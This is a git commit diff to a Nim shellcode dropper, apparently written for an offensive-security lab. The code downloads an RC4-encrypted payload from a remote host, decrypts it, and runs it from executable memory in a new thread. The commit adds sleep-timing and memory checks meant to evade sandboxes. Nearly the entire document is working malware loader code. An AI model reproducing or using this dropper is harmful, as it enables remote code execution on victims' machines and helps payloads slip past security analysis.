3757e28c83e521bcd2e2b6f899bb175c3db4536e
had <85348372+hadhub@users.noreply.github.com>
2025-03-24 10:59:32 +0100

    Update dropper.nim

--- dropper.nim
+++ dropper.nim
@@ -1,35 +1,51 @@
 import RC4
 import httpclient
 import winim/lean
+import std/times, std/os, std/nativesockets
 
 var
-    # precise proxy for wutai lab
-    custom_proxy = newProxy(url="http://PROXY_IP:PORT")
     old_protect : DWORD = PAGE_READWRITE
-    client      = newHttpClient(proxy=custom_proxy)
+    client      = newHttpClient()
     shellcode   = newseq[byte]()
     data        : string
-    key         : string = "wutai.vl"
+    key         : string = "kernel32.dll"
     dec         : string
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
     @(str.toOpenArrayByte(0, str.high))
 
-proc main(): void = 
-    # Get data and decode from RC4
-    data = client.getContent("http://LHOST:LPORT/SHELLCODE")
-    client.close()
-    dec = fromRC4(key, data)
-    shellcode = toByteSeq(dec)
-    # Load in memory
-    var shellcode_len = cast[SIZE_T](len(shellcode))
-    var buffer = VirtualAlloc(nil, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-    CopyMemory(buffer, &shellcode[0], shellcode_len);
-    VirtualProtect(shellcode[0].addr, shellcode_len, PAGE_EXECUTE_READWRITE, oldProtect.addr)
-    let create_thread : HANDLE = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](buffer), NULL, 0, NULL)
-    WaitForSingleObject(create_thread, INFINITE)
-    CloseHandle(create_thread)
 
+proc getMemoryInfo(): tuple[total, available: int64] =
+    var memoryStatus: MEMORYSTATUSEX
+    memoryStatus.dwLength = sizeof(MEMORYSTATUSEX).DWORD
+
+    if GlobalMemoryStatusEx(addr memoryStatus) == 0:
+        raise newException(OSError, "nop")
+    return (total: memoryStatus.ullTotalPhys, available: memoryStatus.ullAvailPhys)
+
+
+proc main(): void = 
+    let start = cpuTime()
+    sleep(5000)
+    let elapsed = cpuTime() - start
+    if elapsed < 4500:
+        quit(0)
+
+    let memInfo = getMemoryInfo()
+    if memInfo.total < 1024 div (1024 * 1024):
+        quit(0)
+    else:
+        data = client.getContent("http://192.168.189.138:8080/api_local")
+        client.close()
+        dec = fromRC4(key, data)
+        shellcode = toByteSeq(dec)
+        var shellcode_len = cast[SIZE_T](len(shellcode))
+        var buffer = VirtualAlloc(nil, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        CopyMemory(buffer, &shellcode[0], shellcode_len);
+        VirtualProtect(shellcode[0].addr, shellcode_len, PAGE_EXECUTE_READWRITE, oldProtect.addr)
+        let create_thread : HANDLE = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](buffer), NULL, 0, NULL)
+        WaitForSingleObject(create_thread, INFINITE)
+        CloseHandle(create_thread)
 
 when isMainModule:
     main()
